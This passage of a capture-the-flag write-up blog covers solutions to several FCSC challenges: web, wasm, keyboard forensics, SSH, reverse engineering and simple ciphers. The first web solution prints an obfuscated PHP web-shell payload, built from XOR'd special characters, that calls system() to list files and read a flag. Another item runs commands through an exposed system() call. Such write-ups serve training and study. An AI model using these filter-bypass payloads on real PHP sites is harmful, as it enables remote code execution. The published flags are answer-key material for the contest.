+<span class="giallo-l"><span>            }</span><span style="color: #F97583;"> catch</span><span> (</span><span style="color: #79B8FF;">ParseError</span><span> $e) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">                die</span><span>(</span><span style="color: #9ECBFF;">&#39;No way! Go away!&#39;</span><span>);</span></span>
+<span class="giallo-l"><span>            }</span></span>
+<span class="giallo-l"><span>        }</span></span>
+<span class="giallo-l"><span>    }</span><span style="color: #F97583;"> else</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">        show_source</span><span>(</span><span style="color: #79B8FF;">__FILE__</span><span>);</span></span>
+<span class="giallo-l"><span>    }</span></span></code></pre>
+<p>We have to create a web shell PHP using only special characters, many webshell like that can be found on Github.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #F97583;">/?</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">system</span><span style="color: #F97583;">&amp;</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">ls</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">20</span><span style="color: #F97583;">-</span><span style="color: #79B8FF;">ailh</span><span style="color: #F97583;">&amp;</span><span style="color: #79B8FF;">code</span><span style="color: #F97583;">=%</span><span style="color: #79B8FF;">24_</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">3D</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">27</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">24</span><span style="color: #F97583;">&lt;&gt;%</span><span style="color: #79B8FF;">2F</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">27</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">5E</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">27</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">27</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">3B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">24</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">24_</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7D</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">5B_</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">5D</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">28</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">24</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7B</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">24_</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">7D</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">5B__</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">5D</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">29</span><span style="color: #F97583;">%</span><span style="color: #79B8FF;">3B</span></span>
+<span class="giallo-l"><span style="color: #F97583;">/?</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">system</span><span style="color: #F97583;">&amp;</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">cat</span><span style="color: #F97583;">+.</span><span style="color: #79B8FF;">f</span><span style="color: #F97583;">*&amp;</span><span style="color: #79B8FF;">code</span><span style="color: #F97583;">=</span><span>$_</span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;">&#39;{&#39;</span><span>;$_</span><span style="color: #F97583;">=</span><span>($_</span><span style="color: #F97583;">^</span><span style="color: #9ECBFF;">&#39;&lt;&#39;</span><span>)</span><span style="color: #F97583;">.</span><span>($_</span><span style="color: #F97583;">^</span><span style="color: #9ECBFF;">&#39;&gt;;&#39;</span><span>)</span><span style="color: #F97583;">.</span><span>($_</span><span style="color: #F97583;">^</span><span style="color: #9ECBFF;">&#39;/&#39;</span><span>);${</span><span style="color: #9ECBFF;">&#39;_&#39;</span><span style="color: #F97583;">.</span><span>$_}[</span><span style="color: #9ECBFF;">&#39;_&#39;</span><span>](${</span><span style="color: #9ECBFF;">&#39;_&#39;</span><span style="color: #F97583;">.</span><span>$_}[</span><span style="color: #9ECBFF;">&#39;__&#39;</span><span>]); </span></span></code></pre>
+<p>Then we execute the commands <code>ls -a</code> and <code>cat .f*</code> to bypass the filter and read the flag.</p>
+<blockquote>
+<p>FCSC{53d195522a15aa0ce67954dc1de7c5063174a721ee5aa924a4b9b15ba1ab6948}</p>
+</blockquote>
+<h3 id="web-flag-checker">WEB - Flag Checker</h3>
+<p>A simple web asm binary where you could guess the flag cipher.
+http://challenges2.france-cybersecurity-challenge.fr:5005/index.js</p>
+<p>We can find a reference to <code>index.wasm</code> in the Javascript.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="javascript"><span class="giallo-l"><span style="color: #F97583;">var</span><span> wasmBinaryFile</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;index.wasm&quot;</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">if</span><span> (</span><span style="color: #F97583;">!</span><span style="color: #B392F0;">isDataURI</span><span>(wasmBinaryFile)) {</span></span>
+<span class="giallo-l"><span>    wasmBinaryFile</span><span style="color: #F97583;"> =</span><span style="color: #B392F0;"> locateFile</span><span>(wasmBinaryFile)</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>We can find the flag since the format is starting by FCSC.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span>a</span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;">&#39;FE@P@x4f1g7f6ab:42`1g:f:7763133;e0e;03`6661`bee0:33fg732;b6fea44be34g0~&#39;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">for</span><span> c</span><span style="color: #F97583;"> in</span><span> a:</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">    print</span><span>(</span><span style="color: #79B8FF;">chr</span><span>(</span><span style="color: #79B8FF;">ord</span><span>(</span><span style="color: #9ECBFF;">&#39;</span><span style="color: #79B8FF;">\x03</span><span style="color: #9ECBFF;">&#39;</span><span>)</span><span style="color: #F97583;">^</span><span style="color: #79B8FF;">ord</span><span>(i)))</span></span></code></pre>
+<blockquote>
+<p>FCSC{7e2d4e5ba971c2d9e944502008f3f830c5552caff3900ed4018a5efb77af07d3}</p>
+</blockquote>
+<h3 id="forensic-petite-frappe-2">Forensic - Petite frappe 2</h3>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span style="color: #F97583;">import</span><span> re, sys</span></span>
+<span class="giallo-l"><span style="color: #F97583;">from</span><span> subprocess</span><span style="color: #F97583;"> import *</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #F97583;">def</span><span style="color: #B392F0;"> get_keymap</span><span>():</span></span>
+<span class="giallo-l"><span>    keymap</span><span style="color: #F97583;"> =</span><span> {}</span></span>
+<span class="giallo-l"><span>    table</span><span style="color: #F97583;"> =</span><span> Popen([</span><span style="color: #9ECBFF;">&#39;xmodmap&#39;</span><span>,</span><span style="color: #9ECBFF;"> &#39;-pke&#39;</span><span>],</span><span style="color: #FFAB70;"> stdout</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">PIPE</span><span>).stdout</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    for</span><span> line</span><span style="color: #F97583;"> in</span><span> table:</span></span>
+<span class="giallo-l"><span>        m</span><span style="color: #F97583;"> =</span><span> re.match(</span><span style="color: #9ECBFF;">&#39;keycode +(\d+) = (.+)&#39;</span><span>, line.decode())</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        if</span><span> m</span><span style="color: #F97583;"> and</span><span> m.groups()[</span><span style="color: #79B8FF;">1</span><span>]:</span></span>
+<span class="giallo-l"><span>            keymap[</span><span style="color: #79B8FF;">str</span><span>(m.groups()[</span><span style="color: #79B8FF;">0</span><span>])]</span><span style="color: #F97583;"> =</span><span> m.groups()[</span><span style="color: #79B8FF;">1</span><span>].split()[</span><span style="color: #79B8FF;">0</span><span>]</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    return</span><span> keymap</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>flag</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span>keymap</span><span style="color: #F97583;"> =</span><span> get_keymap()</span></span>
+<span class="giallo-l"><span style="color: #F97583;">with</span><span style="color: #79B8FF;"> open</span><span>(</span><span style="color: #9ECBFF;">&#39;petite_frappe_2.txt&#39;</span><span>,</span><span style="color: #9ECBFF;"> &#39;r&#39;</span><span>)</span><span style="color: #F97583;"> as</span><span> f:</span></span>
+<span class="giallo-l"><span>    data</span><span style="color: #F97583;"> =</span><span> f.readlines()</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    for</span><span> line</span><span style="color: #F97583;"> in</span><span> data:</span></span>
+<span class="giallo-l"><span>        m</span><span style="color: #F97583;"> =</span><span> re.match(</span><span style="color: #9ECBFF;">&#39;key press +(\d+)&#39;</span><span>, line.decode())</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        if</span><span> m:</span></span>
+<span class="giallo-l"><span>            key</span><span style="color: #F97583;"> =</span><span> keymap[m.groups()[</span><span style="color: #79B8FF;">0</span><span>]]</span></span>
+<span class="giallo-l"><span style="color: #F97583;">            if</span><span> key</span><span style="color: #F97583;"> ==</span><span style="color: #9ECBFF;"> &quot;space&quot;</span><span>:</span></span>
+<span class="giallo-l"><span>                flag</span><span style="color: #F97583;"> +=</span><span style="color: #9ECBFF;"> &quot; &quot;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">            elif</span><span> key</span><span style="color: #F97583;"> ==</span><span style="color: #9ECBFF;"> &quot;underscore&quot;</span><span>:</span></span>
+<span class="giallo-l"><span>                flag</span><span style="color: #F97583;"> +=</span><span style="color: #9ECBFF;"> &quot;_&quot;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">            else</span><span>:</span></span>
+<span class="giallo-l"><span>                flag</span><span style="color: #F97583;"> +=</span><span> key</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #79B8FF;">print</span><span>(flag)</span></span></code></pre>
+<blockquote>
+<p>FCSC{un_clavier_azerty_en_vaut_deux}</p>
+</blockquote>
+<h3 id="intro-babel">Intro - Babel</h3>
+<p>A simple web intro were we could execute arbitrary commands : <code>view-source:challenges2.france-cybersecurity-challenge.fr:5001/?code=cat%20flag.php</code>.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="php"><span class="giallo-l"><span style="color: #F97583;">&lt;?</span><span style="color: #79B8FF;">php</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    if</span><span> (</span><span style="color: #79B8FF;">isset</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;source&#39;</span><span>])) {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        @</span><span style="color: #79B8FF;">show_source</span><span>(</span><span style="color: #79B8FF;">__FILE__</span><span>);</span></span>
+<span class="giallo-l"><span>    }</span><span style="color: #F97583;">  else if</span><span>(</span><span style="color: #79B8FF;">isset</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;code&#39;</span><span>])) {</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">        print</span><span>(</span><span style="color: #9ECBFF;">&quot;&lt;pre&gt;&quot;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">        @</span><span style="color: #79B8FF;">system</span><span>($_GET[</span><span style="color: #9ECBFF;">&#39;code&#39;</span><span>]);</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">        print</span><span>(</span><span style="color: #9ECBFF;">&quot;&lt;pre&gt;&quot;</span><span>);</span></span>
+<span class="giallo-l"><span>    }</span><span style="color: #F97583;"> else</span><span> {</span></span>
+<span class="giallo-l"><span style="color: #F97583;">?&gt;</span></span></code></pre><h3 id="intro-sushi">Intro - SuSHi</h3>
+<p>The flag was in a hidden file <code>.flag</code>.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="powershell"><span class="giallo-l"><span>ssh </span><span style="color: #F97583;">-</span><span>p </span><span style="color: #79B8FF;">6000</span><span> ctf@challenges2.france</span><span style="color: #F97583;">-</span><span>cybersecurity</span><span style="color: #F97583;">-</span><span>challenge.fr </span></span>
+<span class="giallo-l"><span style="color: #79B8FF;"> __    __            _                 __           _     _   ___</span><span> </span></span>
+<span class="giallo-l"><span style="color: #F97583;">/ / /</span><span>\ \ \</span><span style="color: #79B8FF;">__ _ _ __</span><span style="color: #F97583;"> | |</span><span style="color: #79B8FF;">_      __ _</span><span style="color: #F97583;">    /</span><span style="color: #79B8FF;"> _</span><span>\</span><span style="color: #79B8FF;">_   _ ___</span><span style="color: #F97583;">| |</span><span style="color: #79B8FF;">__</span><span> (</span><span style="color: #79B8FF;">_</span><span>)</span><span style="color: #F97583;"> /</span><span style="color: #79B8FF;"> _</span><span> \</span></span>
+<span class="giallo-l"><span>\ \</span><span style="color: #F97583;">/</span><span>  \</span><span style="color: #F97583;">/ /</span><span style="color: #79B8FF;"> _</span><span style="color: #F97583;">` |</span><span style="color: #9ECBFF;"> &#39;_ \| __|    / _` |   \ \| | | / __| &#39;</span><span style="color: #79B8FF;">_</span><span> \</span><span style="color: #F97583;">| |</span><span> \</span><span style="color: #F97583;">// /</span></span>
+<span class="giallo-l"><span> \  </span><span style="color: #F97583;">/</span><span>\  </span><span style="color: #F97583;">/</span><span> (</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">| | | | | |</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">    |</span><span> (</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">| |</span><span style="color: #79B8FF;">   _</span><span>\ \ </span><span style="color: #F97583;">|</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span> \</span><span style="color: #79B8FF;">__</span><span> \ </span><span style="color: #F97583;">| | | |</span><span>   \</span><span style="color: #F97583;">/</span><span> </span></span>
+<span class="giallo-l"><span>  \</span><span style="color: #F97583;">/</span><span>  \</span><span style="color: #F97583;">/</span><span> \</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">,</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">| |</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span>\</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">|</span><span>    \</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">,</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span>   \</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">/</span><span>\</span><span style="color: #79B8FF;">__</span><span style="color: #F97583;">,</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span style="color: #79B8FF;">___</span><span style="color: #F97583;">/</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">| |</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span style="color: #79B8FF;">_</span><span style="color: #F97583;">|</span><span>   () </span></span>
+<span class="giallo-l"><span>ctf@SuSHi:~$ id</span></span>
+<span class="giallo-l"><span>uid</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">999</span><span>(ctf) gid</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">999</span><span>(ctf) groups</span><span style="color: #F97583;">=</span><span style="color: #79B8FF;">999</span><span>(ctf)</span></span>
+<span class="giallo-l"><span>ctf@SuSHi:~$ ls</span></span>
+<span class="giallo-l"><span>ctf@SuSHi:~$ ls </span><span style="color: #F97583;">-</span><span>a</span></span>
+<span class="giallo-l"><span style="color: #F97583;">.</span><span>  .</span><span style="color: #F97583;">.</span><span>  .bash_logout  .bashrc  .flag  .profile</span></span>
+<span class="giallo-l"><span>ctf@SuSHi:~$ cat .flag</span></span>
+<span class="giallo-l"><span>FCSC{ca10e42620c4e3be1b9d63eb31c9e8ffe60ea788d3f4a8ae4abeac3dccdf5b21}</span></span></code></pre><h3 id="intro-tarte-tatin">Intro - Tarte Tatin</h3>
+<p>Using a simple decompiler such as Ghidra or IDA will give us a "pseudo" code like .</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="java"><span class="giallo-l"><span>iVar1 </span><span style="color: #F97583;">=</span><span style="color: #B392F0;"> memcmp</span><span>(local_38,pass_enc,</span><span style="color: #79B8FF;">0x10</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">if</span><span> (iVar1 </span><span style="color: #F97583;">==</span><span style="color: #79B8FF;"> 0</span><span>) {</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">    transform</span><span>(flag_enc);</span></span>
+<span class="giallo-l"><span style="color: #B392F0;">    puts</span><span>(flag_enc);</span></span>
+<span class="giallo-l"><span>}</span></span>
+<span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span style="color: #F97583;">void</span><span style="color: #B392F0;"> transform</span><span>(</span><span style="color: #F97583;">char *</span><span>param_1)</span></span>
+<span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  char *</span><span>pcVar1;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  char *</span><span>local_10;</span></span>
+<span class="giallo-l"><span>  </span></span>
+<span class="giallo-l"><span>  local_10 </span><span style="color: #F97583;">=</span><span> param_1;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  do</span><span> {</span></span>
+<span class="giallo-l"><span>    pcVar1 </span><span style="color: #F97583;">=</span><span> local_10 </span><span style="color: #F97583;">+</span><span style="color: #79B8FF;"> 1</span><span>;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">    *</span><span>local_10 </span><span style="color: #F97583;">= *</span><span>local_10 </span><span style="color: #F97583;">+</span><span style="color: #9ECBFF;"> &#39;</span><span style="color: #79B8FF;">\x</span><span style="color: #9ECBFF;">01&#39;</span><span>;</span></span>
+<span class="giallo-l"><span>    local_10 </span><span style="color: #F97583;">=</span><span> pcVar1;</span></span>
+<span class="giallo-l"><span>  }</span><span style="color: #F97583;"> while</span><span> (</span><span style="color: #F97583;">*</span><span>pcVar1 </span><span style="color: #F97583;">!=</span><span style="color: #9ECBFF;"> &#39;</span><span style="color: #79B8FF;">\0</span><span style="color: #9ECBFF;">&#39;</span><span>);</span></span>
+<span class="giallo-l"><span style="color: #F97583;">  return</span><span>;</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre>
+<p>The transform method is simple caesar cipher, we can grab the flag_enc and decrypt it .</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="powershell"><span class="giallo-l"><span>cat flag_enc </span><span style="color: #F97583;">|</span><span> grep db </span><span style="color: #F97583;">|</span><span> cut </span><span style="color: #F97583;">-</span><span>d </span><span style="color: #9ECBFF;">&quot;&#39;&quot;</span><span style="color: #F97583;"> -f</span><span>2 </span><span style="color: #F97583;">|</span><span> tr </span><span style="color: #F97583;">-</span><span>d </span><span style="color: #9ECBFF;">&quot;\n&quot;</span></span>
+<span class="giallo-l"><span>Vdkk.cnmd .Sgd.ek</span><span style="color: #79B8FF;">`f</span><span>.hr9.EBRBz72e30320b000</span><span style="color: #F97583;">/</span><span>51c</span><span style="color: #F97583;">//</span><span>2cc</span><span style="color: #F97583;">/</span><span>102be713c55e66</span><span style="color: #F97583;">/`/</span><span>ad02</span><span style="color: #F97583;">/</span><span>4d1702e04cc654</span><span style="color: #F97583;">/</span><span style="color: #79B8FF;">2</span><span style="color: #F97583;">`</span><span>80c</span><span style="color: #F97583;">|</span><span>..NzTfdvs4Q4ttx1se</span><span style="color: #F97583;">%</span><span>       </span></span></code></pre>
+<p>A basic cesar -1 python code.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span>a</span><span style="color: #F97583;">=</span><span style="color: #9ECBFF;">&quot;Vdkk.cnmd .Sgd.ek`f.hr9.EBRBz72e30320b000/51c//2cc/102be713c55e66/`/ad02/4d1702e04cc654/2`80c|..NzTfdvs4Q4ttx1se&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>secret</span><span style="color: #F97583;"> =</span><span style="color: #9ECBFF;"> &quot;&quot;</span></span>
+<span class="giallo-l"><span style="color: #F97583;">for</span><span> c</span><span style="color: #F97583;"> in</span><span> a:</span></span>
+<span class="giallo-l"><span>    secret</span><span style="color: #F97583;"> +=</span><span> (</span><span style="color: #79B8FF;">chr</span><span>(</span><span style="color: #79B8FF;">ord</span><span>(c)</span><span style="color: #F97583;">-0x</span><span style="color: #79B8FF;">1</span><span>))</span></span>
+<span class="giallo-l"><span style="color: #79B8FF;">print</span><span>(secret)</span></span></code></pre><pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="powershell"><span class="giallo-l"><span>$ .</span><span style="color: #F97583;">/</span><span>TarteTatin</span></span>
+<span class="giallo-l"><span>MySecur3P3ssw0rd</span></span>
+<span class="giallo-l"><span>Well done</span><span style="color: #F97583;">!</span><span> The flag is: FCSC{83f41431c111062d003dd0213cf824d66f770a0be1305e2813f15dd76503a91d}</span></span></code></pre><h3 id="intro-le-rat-conteur">Intro - Le Rat Conteur</h3>
+<p>The task is giving us the key, the cipher and the IV. We only need to use them.</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="powershell"><span class="giallo-l"><span>openssl enc </span><span style="color: #F97583;">-</span><span>aes</span><span style="color: #F97583;">-</span><span style="color: #79B8FF;">128</span><span style="color: #F97583;">-</span><span>ctr </span><span style="color: #F97583;">-</span><span>d </span><span style="color: #F97583;">-in</span><span> flag.jpg.enc </span><span style="color: #F97583;">-</span><span>pass </span><span style="color: #9ECBFF;">&quot;\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff&quot;</span><span style="color: #F97583;"> -</span><span>iv </span><span style="color: #9ECBFF;">&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span></code></pre>
+<p>![aes]({{ site.baseurl }}/images/FCSC/aes.jpg "aes"){: .center-image }</p>
+<h3 id="intro-sbox">Intro - Sbox</h3>
+<p>A very simple "cryptographic" challenge where you only have to follow the boxes</p>
+<p>![sbox]({{ site.baseurl }}/images/FCSC/sbox.png "sbox"){: .center-image }</p>
+<p>The following truth tables will help</p>
+<p>![bool1]({{ site.baseurl }}/images/FCSC/bool1.jpg "bool1"){: .center-image }</p>
+<p>We can reproduce the logic in Python</p>
+<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="python"><span class="giallo-l"><span>x3</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 1</span></span>
+<span class="giallo-l"><span>x2</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 0</span></span>
+<span class="giallo-l"><span>x1</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 1</span></span>
+<span class="giallo-l"><span>x0</span><span style="color: #F97583;"> =</span><span style="color: #79B8FF;"> 0</span></span>
+<span class="giallo-l"><span>y3</span><span style="color: #F97583;"> =</span><span> x0</span><span style="color: #F97583;"> ^</span><span> (</span><span style="color: #F97583;">not</span><span>(x3</span><span style="color: #F97583;"> |</span><span> x2))</span></span>
+<span class="giallo-l"><span>y2</span><span style="color: #F97583;"> =</span><span> x3</span><span style="color: #F97583;"> ^</span><span> (</span><span style="color: #F97583;">not</span><span>(x2</span><span style="color: #F97583;"> |</span><span> x1))</span></span>
+<span class="giallo-l"><span>y1</span><span style="color: #F97583;"> =</span><span> x2</span><span style="color: #F97583;"> ^</span><span> (</span><span style="color: #F97583;">not</span><span>(y3</span><span style="color: #F97583;"> |</span><span> x1))</span></span>
+<span class="giallo-l"><span>y0</span><span style="color: #F97583;"> =</span><span> x1</span><span style="color: #F97583;"> ^</span><span> (</span><span style="color: #F97583;">not</span><span>(y3</span><span style="color: #F97583;"> |</span><span> y2))</span></span>
+<span class="giallo-l"><span>(y3, y2, y1, y0)</span></span></code></pre>
+<blockquote>
+<p>FCSC{0101}</p>
+</blockquote>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/sthack2022/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>STHACK2022 - Catch the bird, a trip from web to IRL</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/dvid/" accesskey="."
+    ><span>DVID - Damn Vulnerable IoT Device</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a rel="external" href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2026">2026</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
